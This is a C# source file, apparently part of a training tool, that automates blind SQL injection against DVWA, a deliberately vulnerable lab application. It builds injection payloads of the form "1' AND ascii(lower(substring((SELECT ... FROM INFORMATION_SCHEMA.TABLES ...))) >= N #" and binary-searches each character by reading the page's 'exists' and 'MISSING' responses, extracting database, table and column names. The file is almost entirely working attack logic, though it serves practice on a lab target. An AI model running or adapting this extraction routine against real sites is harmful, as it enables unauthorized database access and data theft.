using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tool_SqlInjectionBlind_Dvwa
{
    public static class Handing
    {

        public static ResultRequest.Result GetResultSubmit(HtmlDocument html)
        {
            HtmlElementCollection h = html.GetElementsByTagName("pre");
            if (h.Count != 0)
            {
                if (h[0].InnerHtml.Equals("User ID exists in the database."))//true
                {
                    return ResultRequest.Result.Exists;
                }
                else if (h[0].InnerHtml.Equals("User ID is MISSING from the database.")) //false
                {
                    return ResultRequest.Result.Missing;
                }
            }
            return ResultRequest.Result.Fail;
        }


        public static int Mid(int left, int right)
        {
            return (((right - left) / 2) + left);
        }
        public static string Change_CharCompare_Sql(this string sql, int left, int right)
        {
            //"1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_NAME>'u' LIMIT 1), 1,1))) >= 124 #";
            sql = sql.Substring(0, sql.LastIndexOf(">= ") + 3);
            sql += (Mid(left, right) + " #");
            return sql;
        }

        public static ResultRequest.Job CheckRespond(ResultRequest.Result result, ResultRequest.Mode mode, ResultRequest.Mode_SQL mode_sql,
            ref string sql, ref int left, ref int right, ref int mid, ref string str_result)
        {
            if (result == ResultRequest.Result.Exists)
            {
                if (left == mid) //done
                {
                    //lbl_Result_DBName.Text += (char)mid;
                    if(mode == ResultRequest.Mode.Number)
                    {
                        str_result += mid;
                        return ResultRequest.Job.Done_ALL;
                    }
                    else if (mode == ResultRequest.Mode.String) // end str
                    {
                        if((char)mid == '\0')
                        {
                            str_result = "" + (char)mid;
                            return ResultRequest.Job.Done_ALL;
                        }
                    }

                    str_result = "" + (char)mid;
                    left = 0; right = 255; mid = 127;

                    return ResultRequest.Job.Done_OnePart;
                }
                left = mid;
                sql = sql.Change_CharCompare_Sql(left, right);
                mid = Convert.ToInt32(Mid(left, right));

                return ResultRequest.Job.Continue;
            }
            else if (result == ResultRequest.Result.Missing)
            {
                right = mid;
                sql = sql.Change_CharCompare_Sql(left, right);
                mid = Convert.ToInt32(Mid(left, right));

                return ResultRequest.Job.Continue;
            }
            else if (result == ResultRequest.Result.Fail) //end
            {
                str_result = "|";
                return ResultRequest.Job.Fail;
            }
            else
            {
                return ResultRequest.Job.Fail;
            }
        }

        public static string  Next_Char_Sql(this string sql, ResultRequest.Mode_SQL mode_sql, ref int index)
        {
            if(mode_sql == ResultRequest.Mode_SQL.DB_Name)
            {
                string t = " " + index + ",";
                int length = sql.LastIndexOf(t);
                string str_f = sql.Substring(0, sql.LastIndexOf(t));
                string str_l = "1))) >= 127 #";
                index += 1;
                sql = str_f + " " + index + "," + str_l;
                return sql;
            }
            else if(mode_sql == ResultRequest.Mode_SQL.TABLES_NAME)
            {
                //"1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                string str_f = sql.Substring(0, sql.LastIndexOf("LIMIT ") + "LIMIT ".Length);

                int lc_f = sql.LastIndexOf("LIMIT ") + "LIMIT ".Length + Variable.Index_Tables.ToString().Length;
                int lc_e = sql.LastIndexOf("1), " + index + ",") + 4;
                string str_m = sql.Substring(lc_f,  lc_e - lc_f);

                string str_l = ", 1))) >= 127 #";
                index += 1;
                sql = str_f + Variable.Index_Tables + str_m + index + str_l;
                return sql;
            }
            else if(mode_sql == ResultRequest.Mode_SQL.COLUMNS_NAME)
            {
                //"1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                string str_f = sql.Substring(0, sql.LastIndexOf("LIMIT ") + "LIMIT ".Length);

                int lc_f = sql.LastIndexOf("LIMIT ") + "LIMIT ".Length + Variable.Index_Columns.ToString().Length;
                int lc_e = sql.LastIndexOf("1), " + index + ",") + 4;
                string str_m = sql.Substring(lc_f, lc_e - lc_f);

                string str_l = ", 1))) >= 127 #";
                index += 1;
                sql = str_f + Variable.Index_Columns + str_m + index + str_l;
                return sql;
            }
            return sql;
        }
    }
}
